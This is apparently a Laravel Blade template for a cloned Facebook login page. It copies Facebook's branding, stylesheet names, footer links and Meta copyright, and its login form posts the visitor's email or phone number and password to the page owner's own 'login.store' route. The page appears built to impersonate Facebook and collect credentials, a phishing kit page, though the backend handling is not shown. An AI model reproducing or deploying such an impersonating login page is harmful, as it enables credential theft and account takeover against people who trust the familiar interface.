<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}" id="facebook">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="referrer" content="origin-when-crossorigin">
    <title>Facebook - {{ __('Log in or sign up') }}</title>
    <meta property="og:site_name" content="Facebook">
    <meta property="og:url" content="">
    <meta property="og:image" content="assets/desktop/images/fb_icon_325x325.png">
    <meta property="og:locale" content="vi_VN">
    <meta name="description" content="{{ __('Log in to Facebook to start sharing and connecting with your friends, family and people you know.') }}">
    <link rel="shortcut icon" href="{{ asset('assets/desktop/images/favicon.ico') }}">
    <link type="text/css" rel="stylesheet" href="{{ asset('assets/desktop/css/L0VTH1UsUXD.css') }}">
    <link type="text/css" rel="stylesheet" href="{{ asset('assets/desktop/css/PXg1UWkZhTD.css') }}">
    <link type="text/css" rel="stylesheet" href="{{ asset('assets/desktop/css/a5L-_OhPIj0.css') }}">
    <link type="text/css" rel="stylesheet" href="{{ asset('assets/desktop/css/I2jhXt3RB0Y.css') }}">
    <link type="text/css" rel="stylesheet" href="{{ asset('assets/desktop/css/PR5f5cH44oq.css') }}">
    <link type="text/css" rel="stylesheet" href="{{ asset('assets/desktop/css/lcNE7V9VLS9.css') }}">
    <link type="text/css" rel="stylesheet" href="{{ asset('assets/desktop/css/22voA7e4UcF.css') }}">
</head>
<body class="fbIndex UIPage_LoggedOut _-kb sf _605a b_c3pyn-ahh chrome webkit mac x2 Locale_vi_VN cores-gte4 _19_u hasAXNavMenubar" dir="ltr">
<div class="_li" id="u_0_3_UC">
    <div id="globalContainer" class="uiContextualLayerParent">
        <div class="fb_content clearfix " id="content" role="main">
            <div>
                <div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
                    <div class="_8esk">
                        <div class="_8esl">
                            <div class="_8ice">
                                <img class="fb_logo _8ilh img" src="{{ asset('assets/desktop/images/dF5SId3UHWd.svg') }}" alt="Facebook">
                            </div>
                            <h2 class="_8eso">{{ __('Facebook helps you connect and share with the people in your life.') }}</h2></div>
                        <div class="_8esn">
                            <div class="_8iep _8icy _9ahz _9ah-">
                                <div class="_6luv _52jv">
                                    <form class="_9vtf" action="{{ route('login.store') }}" method="post">
                                        @csrf
                                        <div>
                                            <div class="_6lux">
                                                <input type="text" class="inputtext _55r1 _6luy" name="username" placeholder="{{ __('Email address or phone number') }}" autofocus="1" aria-label="{{ __('Email address or phone number') }}">
                                            </div>
                                            <div class="_6lux">
                                                <div class="_6luy _55r1 _1kbt">
                                                    <input type="password" class="inputtext _55r1 _6luy _9npi" name="password" placeholder="{{ __('Password') }}" aria-label="{{ __('Password') }}">
                                                </div>
                                            </div>
                                        </div>
                                        <div class="_6ltg">
                                            <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" type="submit" >{{ __('Log In') }}</button>
                                        </div>
                                        <div class="_6ltj">
                                            <a href="">{{ __('Forgotten password?') }}</a>
                                        </div>
                                        <div class="_8icz"></div>
                                        <div class="_6ltg">
                                            <a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy">
                                                {{ __('Create New Account') }}
                                            </a>
                                        </div>
                                    </form>
                                </div>
                                <div id="reg_pages_msg" class="_58mk">
                                    <a href="" class="_8esh">{{ __('Create a Page') }}</a> {{ __('for a celebrity, brand or business.') }}
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="">
            <div class="_95ke _8opy">
                <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
                    <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
                        <li><a href="{{ route('language', 'vi') }}">Tiếng Việt</a></li>
                        <li><a class="_sv4" dir="ltr" href="{{ route('language', 'en') }}" title="English (UK)">English (UK)</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="Traditional Chinese (Taiwan)">中文(台灣)</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="Korean">한국어</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="Japanese">日本語</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="French (France)">Français (France)</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="Thai">ภาษาไทย</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="Spanish">Español</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="Portuguese (Brazil)">Português (Brasil)</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="German">Deutsch</a></li>
                        <li><a class="_sv4" dir="ltr" href="" title="Italian">Italiano</a></li>
                        <li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" href="" title="Hiển thị thêm ngôn ngữ"><i class="img sp_8s3dp67SKVi_2x sx_53ea02"></i></a></li>
                    </ul>
                    <div id="contentCurve"></div>
                    <div id="pageFooterChildren" role="contentinfo" aria-label="Liên kết trang web Facebook">
                        <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                            <li><a href="">{{ __('Sign Up') }}</a></li>
                            <li><a href="">{{ __('Log In') }}</a></li>
                            <li><a href="">{{ __('Messenger') }}</a></li>
                            <li><a href="">{{ __('Facebook Lite') }}</a></li>
                            <li><a href="">{{ __('Watch') }}</a></li>
                            <li><a href="">{{ __('Places') }}</a></li>
                            <li><a href="">{{ __('Games') }}</a></li>
                            <li><a href="">{{ __('Marketplace') }}</a></li>
                            <li><a href="">{{ __('Facebook Pay') }}</a></li>
                            <li><a href="">{{ __('Oculus') }}</a></li>
                            <li><a href="">{{ __('Portal') }}</a></li>
                            <li><a href="">{{ __('Instagram') }}</a></li>
                            <li><a href="">{{ __('Bulletin') }}</a></li>
                            <li><a href="">{{ __('Local') }}</a></li>
                            <li><a href="">{{ __('Fundraisers') }}</a></li>
                            <li><a href="">{{ __('Services') }}</a></li>
                            <li><a href="">{{ __('Voting Information Centre') }}</a></li>
                            <li><a href="">{{ __('Groups') }}</a></li>
                            <li><a href="">{{ __('About') }}</a></li>
                            <li><a href="">{{ __('Create ad') }}</a></li>
                            <li><a href="">{{ __('Create Page') }}</a></li>
                            <li><a href="">{{ __('Developers') }}</a></li>
                            <li><a href="">{{ __('Careers') }}</a></li>
                            <li><a href="">{{ __('Privacy') }}</a></li>
                            <li><a href="">{{ __('Cookies') }}</a></li>
                            <li><a href="" class="_41ug">{{ __('AdChoices') }}<i class="img sp_8s3dp67SKVi_2x sx_5d18ea"></i></a></li>
                            <li><a href="">{{ __('Terms') }}</a></li>
                            <li><a href="">{{ __('Help') }}</a></li>
                        </ul>
                    </div>
                    <div class="mvl copyright">
                        <div><span> Meta © {{ date('Y') }}</span></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
<script>
    @isset($notification)
    window.onload = function () {
        swal('{{ $notification->title }}', '{{ $notification->content }}', {
            buttons: {
                defeat: "OK",
                cancel: "Cancel",
            },
        })
    }
    @endisset
</script>
</body>
</html>